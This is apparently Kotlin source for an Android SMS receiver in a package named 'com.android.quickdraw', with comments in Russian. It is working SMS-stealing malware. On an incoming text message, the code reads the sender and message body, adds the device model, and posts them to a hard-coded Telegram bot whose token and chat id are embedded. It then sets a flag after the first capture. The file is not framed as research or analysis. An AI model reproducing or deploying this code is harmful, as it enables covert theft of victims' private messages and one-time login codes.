package com.android.quickdraw

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Bundle
import android.provider.Telephony
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException

class SmsReceiver : BroadcastReceiver() {
    private val client = OkHttpClient()
    private val PREFS_NAME = "SmsPrefs"
    private val SMS_SENT_KEY = "sms_sent"

    override fun onReceive(context: Context, intent: Intent) {
        when (intent.action) {
            Telephony.Sms.Intents.SMS_DELIVER_ACTION,
            "android.provider.Telephony.SMS_RECEIVED" -> {
                // Проверяем, не отправляли ли уже SMS
                val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                if (prefs.getBoolean(SMS_SENT_KEY, false)) {
                    return
                }
                
                handleSms(context, intent)
            }
        }
    }

    private fun handleSms(context: Context, intent: Intent) {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        
        // Пытаемся получить сообщение современным способом
        val smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        smsMessages?.firstOrNull()?.let { sms ->
            sendSmsToBot(
                sender = sms.originatingAddress ?: "Unknown",
                message = sms.messageBody ?: "Empty message"
            )
            prefs.edit().putBoolean(SMS_SENT_KEY, true).apply()
            return
        }

        // Fallback для старых устройств
        val bundle: Bundle? = intent.extras
        val pdus: Array<Any?>? = bundle?.get("pdus") as Array<Any?>?
        pdus?.firstOrNull()?.let { pdu ->
            val smsMessage = android.telephony.SmsMessage.createFromPdu(pdu as ByteArray)
            sendSmsToBot(
                sender = smsMessage.originatingAddress ?: "Unknown",
                message = smsMessage.messageBody ?: "Empty message"
            )
            prefs.edit().putBoolean(SMS_SENT_KEY, true).apply()
        }
    }

    private fun sendSmsToBot(sender: String, message: String) {
        val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
        val chatId = "6331293386"
        val url = "https://api.telegram.org/bot$botToken/sendMessage"
        val deviceModel = "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"

        val text = """
            Новое SMS сообщение
            Отправитель: $sender
            Сообщение: $message
            $deviceModel
        """.trimIndent()

        val mediaType = "application/json".toMediaType()
        val requestBody = """
            {
                "chat_id": "$chatId",
                "text": "$text",
                "parse_mode": "Markdown"
            }
        """.trimIndent().toRequestBody(mediaType)

        val request = Request.Builder()
            .url(url)
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                e.printStackTrace()
            }

            override fun onResponse(call: Call, response: Response) {
                response.close()
            }
        })
    }
}
